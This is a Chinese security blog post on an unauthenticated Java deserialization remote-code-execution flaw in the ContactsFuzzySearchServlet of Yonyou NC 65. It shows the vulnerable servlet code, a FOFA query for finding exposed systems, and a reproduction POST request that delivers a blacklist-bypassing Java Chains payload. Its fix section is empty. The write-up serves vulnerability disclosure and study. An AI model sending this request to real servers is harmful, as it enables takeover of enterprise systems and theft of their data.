---
title: "用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-ContactsFuzzySearchServlet-rce.html
asset_dir: assets/用友nc-contactsfuzzysearchservlet反序列化代码执行rce漏洞
---

# 用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/6 08:37
- 850浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

计算机安全

安全

软件

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理[软件](#)，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`ContactsFuzzySearchServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`ContactsFuzzySearchServlet`反序列化该恶意对象时，就会触发代码执行。该漏洞可能允许攻击者在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞修复方案

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"
>
> 物流软件安全

# 漏洞分析

直接看下`ContactsFuzzySearchServlet`的实现

```
public class ContactsFuzzySearchServlet extends HttpServlet {
    private static final long serialVersionUID = -3711153542187076118L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();
        Logger.error("[searchStart]：");

        try {
            headInfo = (HashMap)in.readObject();
```

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

文件大小转换

# 漏洞复现

```
POST /servlet/ContactsFuzzySearchServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行[命令执行](https://mrxn.net/tag/rce)回显payload

[![用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

[![用友NC ContactsFuzzySearchServlet反序列化代码执行RCE漏洞](images/img-002-bb1b5cd9e495.webp)](https://image.mrxn.net/f8cf05a8b1e647b7845661f576aa7452.webp)

成功执行命令并回显执行结果

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
